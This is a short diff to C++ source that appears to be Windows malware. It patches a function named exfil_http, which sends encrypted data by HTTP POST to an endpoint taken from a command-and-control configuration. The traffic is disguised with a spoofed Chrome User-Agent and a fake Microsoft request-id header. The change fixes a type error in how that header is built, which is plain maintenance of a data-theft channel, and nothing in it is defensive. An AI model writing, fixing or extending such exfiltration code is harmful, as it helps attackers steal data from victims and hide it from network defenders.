@@ -11,6 +11,7 @@
 #include <fstream>
 #include <sstream>
 #include <iomanip>
+#include <chrono>
 #include <windows.h>
 #include <windns.h>
 
@@ -149,8 +150,10 @@ bool exfil_http(const std::vector<byte>& encrypted_data, const C2Config& config)
                                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                                          "Chrome/120.0.0.0 Safari/537.36");
     headers = curl_slist_append(headers, "Accept: application/json");
-    headers = curl_slist_append(headers, "x-ms-client-request-id: " + 
-        crypto::base64_encode(crypto::generate_random_bytes(12)));
+    {
+        std::string req_id = "x-ms-client-request-id: " + crypto::base64_encode(crypto::generate_random_bytes(12));
+        headers = curl_slist_append(headers, req_id.c_str());
+    }
     
     curl_easy_setopt(curl, CURLOPT_URL, config.primary_endpoint.c_str());
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
